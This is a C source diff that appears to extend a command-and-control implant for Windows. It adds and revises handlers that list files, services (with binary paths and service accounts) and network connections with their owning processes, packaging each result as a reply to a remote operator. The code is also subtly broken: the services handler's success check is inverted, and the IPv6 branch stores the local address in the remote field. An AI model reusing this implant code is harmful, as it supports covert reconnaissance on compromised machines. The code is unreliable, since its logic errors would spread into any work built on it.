@@ -740,12 +740,14 @@ BOOL LsHandlerCallback
 {
 	PFILE_INFO* pFirstFileInfo = (PFILE_INFO*)lpArgs;
 	PFILE_INFO pCurrentFileInfo = NULL;
-	UINT64 uModifiedTime = 0;
+	PFILETIME pModifiedTime = NULL;
+	LPSTR lpTemp = NULL;
 
 	if (pFirstFileInfo[0]->dwIdx >= pFirstFileInfo[0]->dwMaxCount) {
 		return TRUE;
 	}
 
+	pCurrentFileInfo = pFirstFileInfo[pFirstFileInfo[0]->dwIdx++];
 	if (IsFolderExist(lpPath)) {
 		pCurrentFileInfo->IsDir = TRUE;
 	}
@@ -753,16 +755,24 @@ BOOL LsHandlerCallback
 		pCurrentFileInfo->uFileSize = GetFileSizeByPath(lpPath);
 	}
 
-	pCurrentFileInfo = pFirstFileInfo[pFirstFileInfo[0]->dwIdx++];
-	pCurrentFileInfo->lpName = GetNameFromPathA(lpPath);
+	lpTemp = ConvertWcharToChar(lpPath);
+	pCurrentFileInfo->lpName = GetNameFromPathA(lpTemp);
+	FREE(lpTemp);
 	pCurrentFileInfo->lpOwner = GetFileOwner(lpPath);
-	uModifiedTime = GetModifiedTime(lpPath);
-	pCurrentFileInfo->uModifiedTime = ConvertFileTimeToUnixTimestamp(uModifiedTime);
-	if (IsStrEndsWithW(lpPath, L".lnk")) {
-		pCurrentFileInfo->lpLinkPath = GetTargetShortcutFile(lpPath);
+	pModifiedTime = GetModifiedTime(lpPath);
+	// #define FILETIME_TO_UNIXTIME(ft) (UINT)((*(LONGLONG*)&(ft)-116444736000000000)/10000000)
+	//pCurrentFileInfo->uModifiedTime = ConvertFileTimeToUnixTimestamp();
+	pCurrentFileInfo->uModifiedTime = (UINT)((*((LONGLONG*)pModifiedTime) - 116444736000000000) / 10000000);
+	FREE(pModifiedTime);
+	if (!pCurrentFileInfo->IsDir && IsStrEndsWithW(lpPath, L".lnk")) {
+		lpTemp = GetTargetShortcutFile(lpPath);
+		pCurrentFileInfo->lpLinkPath = ConvertWcharToChar(lpTemp);
+		FREE(lpTemp);
 	}
 	else {
-		pCurrentFileInfo->lpLinkPath = GetSymbolLinkTargetPath(lpPath);
+		lpTemp = GetSymbolLinkTargetPath(lpPath);
+		pCurrentFileInfo->lpLinkPath = ConvertWcharToChar(lpTemp);
+		FREE(lpTemp);
 	}
 
 	return FALSE;
@@ -797,10 +807,12 @@ PENVELOPE LsHandler
 {
 	PPBElement pRecvElement = NULL;
 	PPBElement FileInfoElement[8];
-	PPBElement FinalElement = NULL;
+	PPBElement LsElement[5];
+	PPBElement pFinalElement = NULL;
 	PPBElement* pElementList = NULL;
 	PBUFFER* UnmarshalledData = NULL;
 	LPSTR lpPath = NULL;
+	LPSTR lpFullPath = NULL;
 	LPWSTR lpConvertedPath = NULL;
 	LPSTR lpErrorDesc = NULL;
 	PENVELOPE pRespEnvelope = NULL;
@@ -808,6 +820,9 @@ PENVELOPE LsHandler
 	PFILE_INFO* FileList = NULL;
 	DWORD i = 0;
 	DWORD j = 0;
+	DWORD dwReturnedLength = 0;
+	CHAR szTimeZone[0x10];
+	TIME_ZONE_INFORMATION TimeZoneInfo;
 
 	pRecvElement = ALLOC(sizeof(PBElement));
 	pRecvElement->Type = Bytes;
@@ -819,12 +834,36 @@ PENVELOPE LsHandler
 	}
 
 	lpPath = DuplicateStrA(UnmarshalledData[0]->pBuffer, 0);
-	lpConvertedPath = ConvertCharToWchar(lpPath);
+	lpFullPath = ALLOC(MAX_PATH + 1);
+	dwReturnedLength = GetFullPathNameA(lpPath, MAX_PATH + 1, lpFullPath, NULL);
+	if (dwReturnedLength == 0) {
+		lpErrorDesc = CreateFormattedErr(GetLastError(), "GetFullPathNameA() failed at %s", __FUNCTION__);
+		goto CLEANUP;
+	}
+	else if (dwReturnedLength > MAX_PATH) {
+		lpFullPath = REALLOC(lpFullPath, dwReturnedLength + 1);
+		GetFullPathNameA(lpPath, dwReturnedLength + 1, lpFullPath, NULL);
+	}
+
+	lpConvertedPath = ConvertCharToWchar(lpFullPath);
 	if (!IsPathExist(lpConvertedPath)) {
-		lpErrorDesc = CreateFormattedErr(0, "%s is not exist", lpPath);
+		lpErrorDesc = CreateFormattedErr(0, "%s is not exist", lpFullPath);
 		goto CLEANUP;
 	}
 
+	SecureZeroMemory(&TimeZoneInfo, sizeof(TimeZoneInfo));
+	GetTimeZoneInformation(&TimeZoneInfo);
+	sprintf_s(szTimeZone, _countof(szTimeZone), "%03d", TimeZoneInfo.Bias / (-60));
+	if (TimeZoneInfo.Bias <= 0) {
+		szTimeZone[0] = '+';
+	}
+	else {
+		szTimeZone[0] = '-';
+	}
+
+	SecureZeroMemory(LsElement, sizeof(LsElement));
+	LsElement[0] = CreateBytesElement(lpFullPath, lstrlenA(lpFullPath), 1);
+	LsElement[1] = CreateVarIntElement(TRUE, 2);
 	if (IsFileExist(lpConvertedPath)) {
 		
 	}
@@ -851,16 +890,19 @@ PENVELOPE LsHandler
 			pElementList[i] = CreateStructElement(FileInfoElement, _countof(FileInfoElement), 0);
 		}
 
-		FinalElement = CreateRepeatedStructElement(pElementList, dwNumberOfItems, 1);
+		LsElement[2] = CreateRepeatedStructElement(pElementList, dwNumberOfItems, 3);
 	}
 
+	LsElement[3] = CreateBytesElement(szTimeZone, lstrlenA(szTimeZone), 4);
+	LsElement[4] = CreateVarIntElement(TimeZoneInfo.Bias < 0 ? -(TimeZoneInfo.Bias * 60) : TimeZoneInfo.Bias * 60, 5);
+	pFinalElement = CreateStructElement(LsElement, _countof(LsElement), 0);
 	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
 	pRespEnvelope->uID = pEnvelope->uID;
 	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
-	pRespEnvelope->pData->pBuffer = FinalElement->pMarshalledData;
-	pRespEnvelope->pData->cbBuffer = FinalElement->cbMarshalledData;
-	FinalElement->pMarshalledData = NULL;
-	FinalElement->cbMarshalledData = 0;
+	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
+	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
+	pFinalElement->pMarshalledData = NULL;
+	pFinalElement->cbMarshalledData = 0;
 CLEANUP:
 	if (lpErrorDesc != NULL) {
 		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
@@ -892,8 +934,12 @@ CLEANUP:
 		FREE(FileList);
 	}
 
+	if (lpFullPath != NULL) {
+		FREE(lpFullPath);
+	}
+
 	FreeElement(pRecvElement);
-	FreeElement(FinalElement);
+	FreeElement(pFinalElement);
 
 	return pRespEnvelope;
 }
@@ -1639,8 +1685,6 @@ PENVELOPE RegistryReadHandler
 		}
 	}
 
-	printf("dwValueType: %d\n", dwValueType);
-	HexDump(pData, cbData);
 	if (dwValueType == REG_BINARY) {
 		lpFormattedValue = ALLOC(cbFormattedValue);
 		dwPos = 1;
@@ -2491,6 +2535,329 @@ CLEANUP:
 	return pRespEnvelope;
 }
 
+PENVELOPE ServicesHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PENVELOPE pRespEnvelope = NULL;
+	LPENUM_SERVICE_STATUS_PROCESSA Services = NULL;
+	LPENUM_SERVICE_STATUS_PROCESSA pService = NULL;
+	PPBElement ServiceDetails[7];
+	PPBElement pFinalElement = NULL;
+	PPBElement* ServiceList = NULL;
+	DWORD dwNumberOfServices = 0;
+	SC_HANDLE hService = NULL;
+	DWORD i = 0;
+	SC_HANDLE hScManager = NULL;
+	LPSTR lpErrorDesc = NULL;
+	LPSERVICE_DESCRIPTIONA lpServiceDesc = NULL;
+	LPQUERY_SERVICE_CONFIGA pServiceConfig = NULL;
+	DWORD dwBytesNeeded = 0;
+
+	Services = EnumServices(&dwNumberOfServices);
+	if (Services == NULL) {
+
+	}
+	if (Services != NULL || dwNumberOfServices == 0) {
+		goto CLEANUP;
+	}
+
+	hScManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_ENUMERATE_SERVICE);
+	if (hScManager == NULL) {
+		lpErrorDesc = CreateFormattedErr(GetLastError(), "OpenSCManagerA failed at %s", __FUNCTION__);
+		goto CLEANUP;
+	}
+
+	ServiceList = ALLOC(sizeof(PPBElement) * dwNumberOfServices);
+	for (i = 0; i < dwNumberOfServices; i++) {
+		pService = &Services[i];
+		ServiceDetails[0] = CreateBytesElement(pService->lpServiceName, lstrlenA(pService->lpServiceName), 1);
+		ServiceDetails[1] = CreateBytesElement(pService->lpDisplayName, lstrlenA(pService->lpDisplayName), 2);
+		hService = OpenServiceA(hScManager, pService->lpServiceName, SERVICE_QUERY_CONFIG | SERVICE_QUERY_STATUS);
+		if (hService != NULL) {
+			QueryServiceConfig2A(hService, SERVICE_CONFIG_DESCRIPTION, NULL, 0, &dwBytesNeeded);
+			if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
+				lpServiceDesc = ALLOC(dwBytesNeeded + 1);
+				if (QueryServiceConfig2A(hService, SERVICE_CONFIG_DESCRIPTION, lpServiceDesc, dwBytesNeeded, &dwBytesNeeded)) {
+					ServiceDetails[2] = CreateBytesElement(lpServiceDesc->lpDescription, lstrlenA(lpServiceDesc->lpDescription), 3);
+				}
+
+				FREE(lpServiceDesc);
+			}
+
+			ServiceDetails[3] = CreateVarIntElement(pService->ServiceStatusProcess.dwCurrentState, 4);
+			QueryServiceConfigA(hService, NULL, 0, &dwBytesNeeded);
+			if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
+				pServiceConfig = ALLOC(dwBytesNeeded + 1);
+				if (QueryServiceConfigA(hService, pServiceConfig, dwBytesNeeded, &dwBytesNeeded)) {
+					ServiceDetails[4] = CreateVarIntElement(pServiceConfig->dwStartType, 5);
+					ServiceDetails[5] = CreateBytesElement(pServiceConfig->lpBinaryPathName, lstrlenA(pServiceConfig->lpBinaryPathName), 6);
+					ServiceDetails[6] = CreateBytesElement(pServiceConfig->lpServiceStartName, lstrlenA(pServiceConfig->lpServiceStartName), 7);
+				}
+
+				FREE(pServiceConfig);
+			}
+
+			CloseServiceHandle(hService);
+		}
+
+		ServiceList[i] = CreateStructElement(ServiceDetails, _countof(ServiceDetails), 0);
+	}
+
+	pFinalElement = CreateRepeatedStructElement(ServiceList, dwNumberOfServices, 1);
+	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
+	pRespEnvelope->uID = pEnvelope->uID;
+	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
+	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
+	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
+	pFinalElement->pMarshalledData = NULL;
+	pFinalElement->cbMarshalledData = 0;
+
+CLEANUP:
+	if (lpErrorDesc != NULL) {
+		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
+		FREE(lpErrorDesc);
+	}
+
+	if (hScManager != NULL) {
+		CloseServiceHandle(hScManager);
+	}
+
+	if (Services != NULL) {
+		FREE(Services);
+	}
+
+	if (ServiceList != NULL) {
+		FREE(ServiceList);
+	}
+
+	FreeElement(pFinalElement);
+
+	return pRespEnvelope;
+}
+
+PENVELOPE NetstatHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PPBElement RecvElementList[5];
+	PPBElement SockTabEntry[6];
+	PPBElement ProcessElement[2];
+	PPBElement SockAddress[2];
+	PPBElement pFinalElement = NULL;
+	PPBElement* SockTabList = NULL;
+	DWORD i = 0;
+	DWORD dwNumberOfBytesRead = 0;
+	PUINT64 pTemp = NULL;
+	PENVELOPE pRespEnvelope = NULL;
+	LPSTR lpErrorDesc = NULL;
+	DWORD dwReturnedLength = 0;
+	BOOL Tcp = FALSE;
+	BOOL Udp = FALSE;
+	BOOL Ipv4 = FALSE;
+	BOOL Ipv6 = FALSE;
+	BOOL Listening = FALSE;
+	PNETWORK_CONNECTION pNetState = NULL;
+	PNETWORK_CONNECTION pConnection = NULL;
+	DWORD dwNumberOfConnections = 0;
+	DWORD dwAddressType = 0;
+	LPSTR lpStateStr = NULL;
+	HANDLE hProc = NULL;
+	LPSTR lpProcessPath = NULL;
+	LPSTR lpProcessImageName = NULL;
+	LPWSTR lpIpAddress = NULL;
+	DWORD cchIpAddress = 0;
+	LPSTR lpTemp = NULL;
+
+	for (i = 0; i < _countof(RecvElementList); i++) {
+		RecvElementList[i] = ALLOC(sizeof(PBElement));
+		RecvElementList[i]->dwFieldIdx = i + 1;
+		RecvElementList[i]->Type = Varint;
+	}
+
+	pTemp = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, &dwNumberOfBytesRead);
+	Tcp = (BOOL)pTemp[0];
+	Udp = (BOOL)pTemp[1];
+	Ipv4 = (BOOL)pTemp[2];
+	Ipv6 = (BOOL)pTemp[3];
+	Listening = (BOOL)pTemp[4];
+
+	pNetState = GetNetworkConnections(&dwNumberOfConnections);
+	SockTabList = ALLOC(sizeof(PPBElement) * dwNumberOfConnections);
+	for (i = 0; i < dwNumberOfConnections; i++) {
+		pConnection = &pNetState[i];
+		SecureZeroMemory(&SockTabEntry, sizeof(SockTabEntry));
+		SecureZeroMemory(&ProcessElement, sizeof(ProcessElement));
+		SecureZeroMemory(&SockAddress, sizeof(SockAddress));
+		if (!Tcp && (pConnection->uProtocolType & TCP_PROTOCOL_TYPE)) {
+			continue;
+		}
+
+		if (!Udp && (pConnection->uProtocolType & UDP_PROTOCOL_TYPE)) {
+			continue;
+		}
+
+		dwAddressType = pConnection->LocalEndpoint.Address.Type;
+		if (!Ipv4 && (dwAddressType == IPV4_NETWORK_TYPE)) {
+			continue;
+		}
+
+		if (!Ipv6 && (dwAddressType == IPV6_NETWORK_TYPE)) {
+			continue;
+		}
+
+		if ((pConnection->uProtocolType & TCP_PROTOCOL_TYPE) && Listening && pConnection->State != MIB_TCP_STATE_LISTEN) {
+			continue;
+		}
+
+		if (pConnection->uProtocolType & TCP_PROTOCOL_TYPE) {
+			if (pConnection->State == MIB_TCP_STATE_CLOSED) {
+				lpStateStr = DuplicateStrA("Closed", 0);
+			}
+			else if (pConnection->State == MIB_TCP_STATE_LISTEN) {
+				lpStateStr = DuplicateStrA("Listen", 0);
+			}
+			else if (pConnection->State == MIB_TCP_STATE_SYN_SENT) {
+				lpStateStr = DuplicateStrA("SYN sent", 0);
+			}
+			else if (pConnection->State == MIB_TCP_STATE_SYN_RCVD) {
+				lpStateStr = DuplicateStrA("SYN received", 0);
+			}
+			else if (pConnection->State == MIB_TCP_STATE_ESTAB) {
+				lpStateStr = DuplicateStrA("Established", 0);
+			}
+			else if (pConnection->State == MIB_TCP_STATE_FIN_WAIT1) {
+				lpStateStr = DuplicateStrA("FIN wait 1", 0);
+			}
+			else if (pConnection->State == MIB_TCP_STATE_FIN_WAIT2) {
+				lpStateStr = DuplicateStrA("FIN wait 2", 0);
+			}
+			else if (pConnection->State == MIB_TCP_STATE_CLOSE_WAIT) {
+				lpStateStr = DuplicateStrA("Close wait", 0);
+			}
+			else if (pConnection->State == MIB_TCP_STATE_CLOSING) {
+				lpStateStr = DuplicateStrA("Closing", 0);
+			}
+			else if (pConnection->State == MIB_TCP_STATE_LAST_ACK) {
+				lpStateStr = DuplicateStrA("Last ACK", 0);
+			}
+			else if (pConnection->State == MIB_TCP_STATE_TIME_WAIT) {
+				lpStateStr = DuplicateStrA("Time wait", 0);
+			}
+			else if (pConnection->State == MIB_TCP_STATE_DELETE_TCB) {
+				lpStateStr = DuplicateStrA("Delete TCB", 0);
+			}
+			else if (pConnection->State == MIB_TCP_STATE_RESERVED) {
+				lpStateStr = DuplicateStrA("Bound", 0);
+			}
+			else {
+				lpStateStr = DuplicateStrA("Unknown", 0);
+			}
+
+			SockTabEntry[2] = CreateBytesElement(lpStateStr, lstrlenA(lpStateStr), 3);
+			FREE(lpStateStr);
+		}
+
+		hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pConnection->ProcessId);
+		if (hProc != NULL) {
+			lpProcessPath = GetProcessImageFileNameWin32(hProc);
+			lpProcessImageName = PathFindFileNameA(lpProcessPath);
+			ProcessElement[0] = CreateVarIntElement(pConnection->ProcessId, 4);
+			ProcessElement[1] = CreateBytesElement(lpProcessImageName, lstrlenA(lpProcessImageName), 13);
+			CloseHandle(hProc);
+			FREE(lpProcessPath);
+			SockTabEntry[4] = CreateStructElement(ProcessElement, _countof(ProcessElement), 5);
+		}
+
+		if (pConnection->uProtocolType & TCP_PROTOCOL_TYPE) {
+			SockTabEntry[5] = CreateBytesElement("tcp", 3, 6);
+		}
+		else {
+			SockTabEntry[5] = CreateBytesElement("udp", 3, 6);
+		}
+
+		if (dwAddressType == IPV4_NETWORK_TYPE) {
+			cchIpAddress = INET_ADDRSTRLEN + 1;
+			lpIpAddress = ALLOC(cchIpAddress * sizeof(WCHAR));
+			RtlIpv4AddressToStringExW(&pConnection->LocalEndpoint.Address.InAddr, 0, lpIpAddress, &cchIpAddress);
+			lpTemp = ConvertWcharToChar(lpIpAddress);
+			SockAddress[0] = CreateBytesElement(lpTemp, lstrlenA(lpTemp), 1);
+			SockAddress[1] = CreateVarIntElement(pConnection->LocalEndpoint.Port, 2);
+			SockTabEntry[0] = CreateStructElement(SockAddress, _countof(SockAddress), 1);
+			FREE(lpTemp);
+			FREE(lpIpAddress);
+
+			cchIpAddress = INET_ADDRSTRLEN + 1;
+			lpIpAddress = ALLOC(cchIpAddress * sizeof(WCHAR));
+			RtlIpv4AddressToStringExW(&pConnection->RemoteEndpoint.Address.InAddr, 0, lpIpAddress, &cchIpAddress);
+			lpTemp = ConvertWcharToChar(lpIpAddress);
+			SockAddress[0] = CreateBytesElement(lpTemp, lstrlenA(lpTemp), 1);
+			SockAddress[1] = CreateVarIntElement(pConnection->RemoteEndpoint.Port, 2);
+			SockTabEntry[1] = CreateStructElement(SockAddress, _countof(SockAddress), 2);
+			FREE(lpTemp);
+			FREE(lpIpAddress);
+		}
+		else {
+			cchIpAddress = INET6_ADDRSTRLEN + 1;
+			lpIpAddress = ALLOC(cchIpAddress * sizeof(WCHAR));
+			RtlIpv6AddressToStringExW(&pConnection->LocalEndpoint.Address.InAddr, 0, 0, lpIpAddress, &cchIpAddress);
+			lpTemp = ConvertWcharToChar(lpIpAddress);
+			SockAddress[0] = CreateBytesElement(lpTemp, lstrlenA(lpTemp), 1);
+			SockAddress[1] = CreateVarIntElement(pConnection->LocalEndpoint.Port, 2);
+			SockTabEntry[1] = CreateStructElement(SockAddress, _countof(SockAddress), 2);
+			FREE(lpTemp);
+			FREE(lpIpAddress);
+
+			cchIpAddress = INET6_ADDRSTRLEN + 1;
+			lpIpAddress = ALLOC(cchIpAddress * sizeof(WCHAR));
+			RtlIpv6AddressToStringExW(&pConnection->RemoteEndpoint.Address.InAddr, 0, 0, lpIpAddress, &cchIpAddress);
+			lpTemp = ConvertWcharToChar(lpIpAddress);
+			SockAddress[0] = CreateBytesElement(lpTemp, lstrlenA(lpTemp), 1);
+			SockAddress[1] = CreateVarIntElement(pConnection->RemoteEndpoint.Port, 2);
+			SockTabEntry[1] = CreateStructElement(SockAddress, _countof(SockAddress), 2);
+			FREE(lpTemp);
+			FREE(lpIpAddress);
+		}
+
+		SockTabList[i] = CreateStructElement(SockTabEntry, _countof(SockTabEntry), 0);
+	}
+
+	pFinalElement = CreateRepeatedStructElement(SockTabList, dwNumberOfConnections, 1);
+	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
+	pRespEnvelope->uID = pEnvelope->uID;
+	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
+	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
+	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
+	pFinalElement->pMarshalledData = NULL;
+	pFinalElement->cbMarshalledData = 0;
+CLEANUP:
+	if (lpErrorDesc != NULL) {
+		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
+		FREE(lpErrorDesc);
+	}
+
+	for (i = 0; i < _countof(RecvElementList); i++) {
+		FreeElement(RecvElementList[i]);
+	}
+
+	if (pNetState != NULL) {
+		FREE(pNetState);
+	}
+
+	if (pTemp != NULL) {
+		FREE(pTemp);
+	}
+
+	if (SockTabList != NULL) {
+		FREE(SockTabList);
+	}
+
+	FreeElement(pFinalElement);
+	return pRespEnvelope;
+}
+
 VOID MainHandler
 (
 	_Inout_ PTP_CALLBACK_INSTANCE Instance,
@@ -2572,7 +2939,7 @@ VOID MainHandler
 	
 	}
 	else if (pEnvelope->uType == MsgNetstatReq) {
-	
+		pResp = NetstatHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgMakeTokenReq) {
 	
@@ -2602,7 +2969,7 @@ VOID MainHandler
 		pResp = RegistryListValuesHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgServicesReq) {
-	
+		pResp = ServicesHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgServiceDetailReq) {
 	
